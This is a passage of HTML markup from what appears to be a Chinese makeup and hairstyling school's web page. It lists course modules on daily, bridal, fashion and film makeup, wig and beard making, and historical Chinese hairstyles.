style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、面部骨骼分析</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、 脸型、眉型、眼型、唇型的化法与改变</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、画眼线的正确技法和腮红的打法与正确的选色的运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、美目贴的正确剪贴和运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">&nbsp;9、假睫毛的修剪和正确粘贴</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">10、假睫毛的修剪和正确黏贴</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">11、眼影的色彩分析与正确的运用技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">12、各种脸型的矫正化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">13、结构透明妆裸妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">14、日常生活妆的化妆方法与色彩的运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">二 现代发型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、发型基础原理及专业造型师必备</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、基础造型分区、倒梳、手打卷、包发</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、刘海与脸型的搭配技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、脸型与发型搭配技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、假发认识及真假发的操作原理与技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6 、时尚、经典新娘造型多变分析</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7 、造型饰品制作及运用原理</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8 、电卷发的操作技巧及运用原理</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">9、盘包类手法:包的基础手法设计与运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">10、辫法类手法:插手辫、千手辫、各类编法之间的关系及辨发手法在韩式造型中的作用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">11、波纹类手法:手推波纹、手摆波纹、复古类造型与时尚造型的结合</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">12、赫本造型:时尚赫本古风格赫本新娘赫本夸张赫本</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">13、朋克风格:影楼朋克造型、时尚T台朋克造型、前卫女生活朋克造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">14、欧式造型:晚会欧式造型、主持人欧式造型、T台欧式造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">15、真假发结合:发型中真假发结合及饰品和假发的应用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">16、短发造型:在造型中短发的变化及演示</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">17、创意造型：舞台创意发型，大赛创意发型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">18、发型与脸型，身型，五官，发色，场合，职业等关系与搭配设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第二部分:影楼化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">一影楼白纱主题整体形象设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、影楼经典白沙主题一欧式白纱(端庄、圣洁)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、影楼流行白纱主题韩式白纱(精致、淡雅</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、影楼特色白纱主題一芭比白纱(活泼、俏丽)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、影楼创意白纱主题MⅨ白纱(别致、新颖)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、影楼时尚白纱主题复古、画意新娘</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、白纱新娘整体考核、作品点评</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">二 影楼晚礼整体形象设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、影楼含蓄晚礼主题画意晚礼(温馨、惬意)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、影楼流行晚礼主题一人鱼晚礼(魅感、优雅</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、影楼时尚晚礼主题红毯妆(简约、高雅)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、影楼经典晚礼主题宫廷妆(高贵、华丽</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、影楼创新晚礼主题mix(艺术 个性）</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、晚礼新娘整体考核、作品点评</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">三 影楼特色服整体形象设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、影楼国风特色主题古装(雍容、华贵)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、影楼民国特色主题旗袍秀禾(温婉、秀丽)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、影楼艺术特色主题敦媓水噩(瑰丽、柔美)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、影楼民族待色主题一波西米亚(自然健康)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、影楼特色服整体考核、作品点评</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">四 影楼主题设计应用(写真）</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、影楼中的异域风-韩服，和服，印度，埃及</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、影楼西方文化素养培训-奇特、波普，朋克</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、同—个模特不同造型的设计与转换一流程示范</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">五、工作能力培训</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、影楼技术部门营销课程</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、影楼时尚、个性写真整体造型设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、影楼灯光、摄影、数码与化妆的配合</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、影楼常见突发事件问题的解决方法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5，年度个大型影楼的最新样片的观摩</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、化妆师与顾客的沟通技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第三部分:高级彩妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、时尚妆面与日妆、婚纱妆的区别与化妆手法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、时尚彩妆流行超势色彩选择运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3，透明妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4，艺术写真（艺术照发型妆面整体造型设计）</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、电视节目主持人妆面(新闻主持、综艺栏目主持、少儿节目主持及男主持人等)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、广告妆面(立体广告、平面广告、明星妆等)化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、模特妆(台模特、杂志封面模特)化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、日本艺妓妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">9、时尚韩国流行妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">10、欧式妆、假双化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">11、晒伤妆、创艺妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">12、大小烟熏妆的化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">13、小丑妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">14、印度妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">15、T台男妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">16、青年妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">17、白领丽人妆化妆技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">18、时尚整体妆面与发型、发饰的搭配技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\"><br/></span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal; text-align: center;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\"><img src=\"http://www.zzhqxx.com/uploads/allimg/20190916/1568645016466825.jpg\" title=\"1568645016466825.jpg\" alt=\"20.jpg\" style=\"border: 0px; font-stretch: normal; font-size: 12.48px; line-height: 1.5; font-family: tahoma, Helvetica, arial, 宋体, sans-serif; vertical-align: top;\"/></span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第四部分:毛发制作</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、工具认识—毛发制作的工具认识和所需材料</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、道士头套—根据影视剧年代人物作头套的步骤方法(道土头马蹄盖、发片)</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、清朝头套一古装半头头套制作、清朝马蹄盖头套制作</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、胡子制作—据影视剧年代人物性档制作胡子山羊胡、络腮胡一字胡</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、眉毛制作—据影视剧年代人物性格制作眉毛</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、胡子修，剪，烫的技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、头套、胡子的正确粘贴方法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、胡子、头套拍摄中穿帮遮盖技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第五部分:古代发型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、古代发型认识</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、唐，宋，元，明，清饰品制作</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、影视古装戏梳妆的流程</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、影视古代发型梳妆所用的工具</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、唐，宋，元，明、清不同朝代发包、发件、发簪制作方法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、影视剧不同朝代人物的发包发件运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、不同年代的发型区别与发型梳理技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、唐，宋，元，明，清发型设计与梳理</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">9、清末民初二三十年代发型设计与梳理</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第六部分:影视化妆、伤效化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">一 影视化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: 